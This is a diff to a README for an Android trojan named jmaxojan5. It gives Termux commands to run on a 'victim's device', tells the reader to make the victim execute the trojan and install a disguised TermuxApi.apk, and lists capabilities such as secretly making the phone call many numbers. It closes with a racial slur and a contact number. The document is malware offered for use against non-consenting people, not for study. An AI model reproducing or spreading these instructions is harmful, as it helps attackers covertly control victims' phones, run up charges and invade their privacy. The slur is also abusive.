@@ -1,13 +1,14 @@
 # jmaxojan5
 Jmaxojan v: 5.8
 
+# installation 
 Run this comands in victim's device:
-
+```
 pkg update
 pkg upgrade
 pkg install git -y
 git clone https://github.com/jmaxojan/jmaxojan5
-
+```
 to start the trojan make the victim execute:
 bash *
 
@@ -29,5 +30,5 @@ an apk will appear in /sdcard named TermuxApi.apk make the victim install it and
 4) make the phone call many numbers secretly.
 5) change the wallpaper.
 
-HAVE FUN AND PRAY 4 ME NIGGAS , JMAX - WA : +967774077451
+HAVE FUN AND PRAY 4 ME NIGGAS , JMAX - WA : +995 322 04 80 63
 
